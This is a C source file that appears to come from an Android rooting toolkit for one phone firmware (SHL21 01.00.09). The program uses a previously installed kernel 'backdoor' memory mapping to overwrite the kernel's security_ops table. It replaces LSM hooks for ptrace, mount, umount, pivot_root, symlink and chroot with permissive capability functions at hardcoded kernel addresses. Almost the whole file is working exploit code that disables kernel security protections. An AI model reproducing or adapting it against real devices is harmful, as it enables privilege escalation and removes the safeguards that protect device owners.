#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "device_database/device_database.h"
#include "backdoor_mmap.h"

#define SECURITY_OPS_OFFSET     3

#define NUM_SECURITY_OPS        140


typedef struct {
  unsigned long int lsm_func;
  unsigned long int cap_func;
} lsm_fix_t;

unsigned long int security_ops;
lsm_fix_t *lsm_fixes;
int n_lsm_fixes;

#define security_ops_01_00_09   0xc0e78c64

static lsm_fix_t lsm_fixes_01_00_09[] = {
  { 0xc0341e14, 0xc033fbbc },   // ptrace_access_check
  { 0xc0341e1c, 0xc033fb38 },   // ptrace_traceme
  { 0xc03422e4, 0xc0341a10 },   // sb_mount
  { 0xc0342284, 0xc0341a18 },   // sb_umount
  { 0xc0342120, 0xc0341a20 },   // sb_pivotroot
  { 0xc0342188, 0xc0341b08 },   // path_symlink
  { 0xc0342100, 0xc0341b38 },   // path_chroot
};

static int n_lsm_fixes_01_00_09 = sizeof (lsm_fixes_01_00_09) / sizeof (lsm_fixes_01_00_09[0]);

bool
unlock_lsm(void)
{
  unsigned long int *p;
  int count = 0;
  int i;

  p = backdoor_convert_to_mmaped_address((void *)security_ops);

  for (i = SECURITY_OPS_OFFSET; i < NUM_SECURITY_OPS; i++) {
    int j;

    for (j = 0; j < n_lsm_fixes; j++) {
      if (p[i] == lsm_fixes[j].lsm_func) {
        p[i] = lsm_fixes[j].cap_func;
        count++;
        break;
      }
    }
  }

  printf("  %d functions are fixed.\n", count);

  return count > 0;
}

static bool
do_unlock(void)
{
  bool ret;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = unlock_lsm();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  switch (detect_device()) {
  case DEVICE_SHL21_01_00_09:
    security_ops = security_ops_01_00_09;
    lsm_fixes = lsm_fixes_01_00_09;
    n_lsm_fixes = n_lsm_fixes_01_00_09;
    break;

  default:
    print_reason_device_not_supported();
    return 1;
  }

  if (!do_unlock()) {
    printf("Failed to unlock LSM protect.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
